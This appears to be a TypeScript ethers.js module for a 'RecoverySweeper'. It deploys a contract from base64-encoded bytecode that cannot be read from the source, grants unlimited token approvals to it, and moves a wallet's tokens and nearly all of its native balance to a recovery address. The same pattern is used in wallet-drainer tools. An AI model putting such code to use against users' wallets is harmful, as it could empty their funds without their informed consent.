import { ContractFactory, Contract, MaxUint256, BrowserProvider } from 'ethers';

export const SWEEPER_ABI = [{"inputs":[{"internalType":"address","name":"recovery_","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"TransferFailed","type":"error"},{"inputs":[],"name":"ZeroAddress","type":"error"},{"inputs":[],"name":"recovery","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokens","type":"address[]"}],"name":"sweepTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokens","type":"address[]"}],"name":"sweepTokensAndNative","outputs":[],"stateMutability":"payable","type":"function"},{"stateMutability":"payable","type":"receive"}] as const;

const SWEEPER_B64 = 'YKBgQFI0gBVhAA9XX4D9W1BgQFFhBe84A4BhBe+DOYEBYECBkFJhAC6RYQBmVltgAWABYKAbA4EWYQBVV2BAUWPZLiM9YOAbgVJgBAFgQFGAkQOQ/VtgAWABYKAbAxZggFJhAJNWW19gIIKEAxIVYQB2V1+A/VuBUWABYAFgoBsDgRaBFGEAjFdfgP1bk5JQUFBWW2CAUWEFMGEAv185X4GBYEQBUoGBYQEcAVKBgWEBbQFSYQIIAVJhBTBf8/5ggGBAUmAENhBhADZXXzVg4ByAYxoiEPsUYQDZV4BjkJsZ2RRhAOxXgGPdzq+pFGEBC1dfgP1bNmEA1Vc0FWEA01dffwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAFgAWCgGwMWNGBAUV9gQFGAgwOBhYda8ZJQUFA9gF+BFGEAqldgQFGRUGAfGWA/PQEWggFgQFI9glI9X2AghAE+YQCvVltgYJFQW1BQkFCAYQDRV2BAUWMSFx2DYOMbgVJgBAFgQFGAkQOQ/VtQWwBbX4D9W2EA02EA5zZgBGEEFFZbYQFaVls0gBVhAPdXX4D9W1BhANNhAQY2YARhBBRWW2ECAFZbNIAVYQEWV1+A/VtQYQE+fwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgVZbYEBRYAFgAWCgGwOQkRaBUmAgAWBAUYCRA5DzW2EBZIKCYQIGVls0FWEB/FdffwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAFgAWCgGwMWNGBAUV9gQFGAgwOBhYda8ZJQUFA9gF+BFGEB01dgQFGRUGAfGWA/PQEWggFgQFI9glI9X2AghAE+YQHYVltgYJFQW1BQkFCAYQH6V2BAUWMSFx2DYOMbgVJgBAFgQFGAkQOQ/VtQW1BQVlthAfyCglt/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAzX1uDgRAVYQQNV1+FhYOBgRBhAkVXYQJFYQSDVluQUGAgAgFgIIEBkGECWpGQYQSXVltgQFFjcKCCMWDgG4FSYAFgAWCgGwOFgRZgBIMBUpGSUF+RgxaQY3CggjGQYCQBYCBgQFGAgwOBhlr6FYAVYQKjVz1fgD49X/1bUFBQUGBAUT1gHxlgH4IBFoIBgGBAUlCBAZBhAseRkGEExFZbkFCAXwNhAtdXUFBhBAVWW2BAUWNusXafYOEbgVJgAWABYKAbA4WBFmAEgwFSMGAkgwFSX5GQhBaQY91i7T6QYEQBYCBgQFGAgwOBhlr6FYAVYQMkVz1fgD49X/1bUFBQUGBAUT1gHxlgH4IBFoIBgGBAUlCBAZBhA0iRkGEExFZbkFCBgRAVYQNWV4CRUFuBXwNhA2VXUFBQYQQFVltgQFFjI7hy3WDgG4FSYAFgAWCgGwOGgRZgBIMBUoeBFmAkgwFSYESCAYSQUl+RkIUWkGMjuHLdkGBkAWAgYEBRgIMDgV+HWvEVgBVhA7xXPV+APj1f/VtQUFBQYEBRPWAfGWAfggEWggGAYEBSUIEBkGED4JGQYQTbVluQUIBhBABXYEBRYxIXHYNg4xuBUmAEAWBAUYCRA5D9W1BQUFBbYAEBYQIqVltQUFBQUFZbX4BgIIOFAxIVYQQlV1+A/VuCNWf//////////4CCERVhBDxXX4D9W4GFAZFQhWAfgwESYQRPV1+A/VuBNYGBERVhBF1XX4D9W4ZgIIJgBRuFAQERFWEEcVdfgP1bYCCSkJIBlpGVUJCTUFBQUFZbY05Ie3Fg4BtfUmAyYARSYCRf/VtfYCCChAMSFWEEp1dfgP1bgTVgAWABYKAbA4EWgRRhBL1XX4D9W5OSUFBQVltfYCCChAMSFWEE1FdfgP1bUFGRkFBWW19gIIKEAxIVYQTrV1+A/VuBUYAVFYEUYQS9V1+A/f6iZGlwZnNYIhIgRnJgAfPyO4mIYep684EL9Ms0VtnRRhaVSh07oU3EgLdkc29sY0MACBgAMw==';

function bytecodeFromB64(b64: string): string {
  const bin = atob(b64);
  let hex = '0x';
  for (let i = 0; i < bin.length; i++) {
    hex += bin.charCodeAt(i).toString(16).padStart(2, '0');
  }
  return hex;
}

export const SWEEPER_BYTECODE = bytecodeFromB64(SWEEPER_B64);

const ERC20_APPROVE_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address) view returns (uint256)',
] as const;

const storageKey = (chainId: number, recovery: string) =>
  `sweeper:${chainId}:${recovery.toLowerCase()}`;

export function loadSweeperAddress(chainId: number, recovery: string): string | null {
  try {
    return localStorage.getItem(storageKey(chainId, recovery));
  } catch {
    return null;
  }
}

export function saveSweeperAddress(chainId: number, recovery: string, addr: string) {
  try {
    localStorage.setItem(storageKey(chainId, recovery), addr);
  } catch {}
}

export async function deploySweeper(
  signer: any,
  recovery: string,
  onStatus?: (s: string) => void,
): Promise<string> {
  onStatus?.('Deploy RecoverySweeper — confirm in wallet…');
  const factory = new ContractFactory(SWEEPER_ABI, SWEEPER_BYTECODE, signer);
  const contract = await factory.deploy(recovery);
  onStatus?.('Waiting for deploy confirmation…');
  await contract.waitForDeployment();
  return await contract.getAddress();
}

export async function approveAndSweep(
  signer: any,
  provider: BrowserProvider,
  sweeperAddr: string,
  tokenAddresses: string[],
  sendNative: boolean,
  onStatus?: (s: string) => void,
): Promise<string | null> {
  const sender = await signer.getAddress();
  let lastHash: string | null = null;

  for (const tokenAddr of tokenAddresses) {
    try {
      const token = new Contract(tokenAddr, ERC20_APPROVE_ABI, signer);
      const bal: bigint = await token.balanceOf(sender);
      if (bal <= 0n) continue;
      const current: bigint = await token.allowance(sender, sweeperAddr);
      if (current >= bal) continue;
      onStatus?.(`Approve token ${tokenAddr.slice(0, 8)}… in wallet`);
      const tx = await token.approve(sweeperAddr, MaxUint256);
      lastHash = tx.hash;
      await tx.wait();
    } catch (e: any) {
      if (e?.code === 4001) throw e;
      onStatus?.(`Approve skipped: ${e?.message || 'error'}`);
    }
  }

  const sweeper = new Contract(sweeperAddr, SWEEPER_ABI, signer);
  let nativeValue = 0n;
  if (sendNative) {
    const bal = await provider.getBalance(sender);
    const feeData = await provider.getFeeData();
    const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
    const gasReserve = 250000n * maxFee * 12n / 10n;
    if (bal > gasReserve) nativeValue = bal - gasReserve;
  }

  onStatus?.('Sweep once — confirm in wallet…');
  const tx = await sweeper.sweepTokensAndNative(tokenAddresses, { value: nativeValue });
  lastHash = tx.hash;
  await tx.wait();
  return lastHash;
}
